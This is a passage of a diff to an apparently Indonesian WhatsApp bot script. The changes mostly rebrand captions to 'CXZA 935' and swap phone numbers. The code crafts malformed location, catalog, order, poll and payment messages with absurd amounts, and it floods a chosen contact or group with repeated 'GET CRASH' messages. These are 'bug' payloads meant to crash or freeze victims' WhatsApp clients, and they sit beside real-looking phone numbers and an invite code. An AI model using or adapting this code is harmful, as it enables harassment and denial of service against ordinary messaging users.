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\nX-WA-BIZ-DESCRIPTION:Developer © 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓WhatsApp / Script Bot ORDER ? CHAT AJA 👋\nX-WA-BIZ-NAME:Haikal\nEND:VCARD",
 }
 }), { userJid: m.chat, quoted: doc })
 haikal.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
@@ -606,7 +606,7 @@ var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 "liveLocationMessage": {
 "degreesLatitude": -6.9367014,
 "degreesLongitude": 107.7228574,
-"caption": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍${ngazap(prefix)}`,
+"caption": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓${ngazap(prefix)}`,
 "sequenceNumber": "1657237469254001",
 "jpegThumbnail": messa.imageMessage,
 }
@@ -622,7 +622,7 @@ var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "locationMessage": {
 "degreesLatitude": -6.936928157735237,
 "degreesLongitude": 107.72270679473877,
-"caption": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍${ngazap(prefix)}`,
+"caption": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓${ngazap(prefix)}`,
 "jpegThumbnail": messa.imageMessage,
 }
 }), { userJid: m.chat, quoted: doc })
@@ -638,8 +638,8 @@ var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject(
 "groupInviteMessage": {
 "groupJid": "85296556573-1328272333@g.us",
 "inviteCode": "wFHwtOxGQN8OwK2x",
-"inviteExpiration": `MY NAME CXZA 935${ngazap(prefix)}`,
-"groupName": `MY NAME CXZA 935${ngazap(prefix)}`,
+"inviteExpiration": `MY NAME © 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓${ngazap(prefix)}`,
+"groupName": `MY NAME © 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓${ngazap(prefix)}`,
 "caption": `${ngazap(prefix)}`,
 "jpegThumbnail": messa.imageMessage,
 }
@@ -659,10 +659,10 @@ var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "itemCount": 100000000000,
 "status": "INQUIRY",
 "surface": "CATALOG",
-"message": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍${ngazap(prefix)}`,
+"message": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓${ngazap(prefix)}`,
 "jpegThumbnail":fs.readFileSync('./baseikal/image/pict.jpg'),
-"orderTitle": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍${ngazap(prefix)}`,
-"sellerJid": "6285775422460@s.whatsapp.net",
+"orderTitle": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓${ngazap(prefix)}`,
+"sellerJid": "6283149877456@s.whatsapp.net",
 "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
 "totalAmount1000": "500000000000000",
 "totalCurrencyCode": "IDR",
@@ -681,19 +681,19 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "product": {
 "productImage": messa.imageMessage,
 "productId": "449756950375071",
-"title": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍${ngazap(prefix)}`,
-"description": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+"title": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓${ngazap(prefix)}`,
+"description": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 "jpegThumbnail": mekih,
 "currencyCode": "IDR",
-"footerText": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+"footerText": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 "priceAmount1000": "10000000",
 "productImageCount": 1,
 "firstImageId": 1,
 "salePriceAmount1000": "10000000",
-"retailerId": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
-"url": "wa.me/6285775422460"
+"retailerId": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
+"url": "wa.me/6283149877456"
 },
-"businessOwnerJid": "6285775422460@s.whatsapp.net",
+"businessOwnerJid": "6283149877456@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: doc })
 haikal.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
@@ -704,7 +704,7 @@ if (!mek.key.fromMe) return reply('Khusus Owner Ajg!')
 if (isBan) throw sticBanLu(from)
 var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "pollCreationMessage": {
-"name": "KENALIN NIH DEK CXZA 935",
+"name": "BUG POLLING © 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓",
 "options": [
 	{
 "optionName": "KATANYA WA KEBAL"
@@ -719,7 +719,7 @@ var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 "optionName": "KATANYA KEBAL"
 	},
 	{
-"optionName": "CXZA 935 said"
+"optionName": "© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 SAID"
 	}
 ],
 "selectableOptionsCount": 5
@@ -742,16 +742,16 @@ var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
 "product": {
 "productImage": messa.imageMessage,
 "productId": "449756950375071",
-"title": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍${ngazap(prefix)}`,
-"description": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+"title": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓${ngazap(prefix)}`,
+"description": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 "currencyCode": "IDR",
-"footerText": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+"footerText": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 "productImageCount": 1,
 "firstImageId": 1,
-"retailerId": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
-"url": "wa.me/6285775422460"
+"retailerId": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
+"url": "wa.me/6283149877456"
 },
-"businessOwnerJid": "6285775422460@s.whatsapp.net",
+"businessOwnerJid": "6283149877456@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: doc})
 haikal.relayMessage(num, catalog.message, { messageId: catalog.key.id })
@@ -774,7 +774,7 @@ var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.from
 "currencyCodeIso4217": "IDR",
 "amount1000": "100",
 "extendedTextMessage": {
-"text": `MY DEVELOPER CXZA 935`,
+"text": `MY DEVELOPER 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 }
 }}), { userJid: m.chat, quoted: doc})
 haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -796,7 +796,7 @@ var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.from
 "currencyCodeIso4217": "IDR",
 "amount1000": "100",
 "extendedTextMessage": {
-"text": `MY DEVELOPER CXZA 935`,
+"text": `MY DEVELOPER 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 }
 }}), { userJid: m.chat, quoted: doc})
 haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -811,35 +811,25 @@ if (!mek.key.fromMe) return reply('Khusus Owner Ajg!')
 if (isBan) throw sticBanLu(from)
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
 }
 reply(`Succes`)
@@ -854,7 +844,7 @@ case 'sendbutton':
 ]
                       
                     buttonMessagepc = {
-                          text: "CXZA 935",
+                          text: "© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓",
                           footerText: 'KONTOL',
                           buttons: buttonspc,
                           headerType: 1
@@ -869,65 +859,45 @@ if (isBan) throw sticBanLu(from)
 if (!mek.key.fromMe) return reply('Khusus Owner Ajg!')
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
 a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
+haikal.sendMessage(Pe, {text: "𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
 await sleep(20)
-haikal.sendMessage(Pe, {text: "𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: doc})
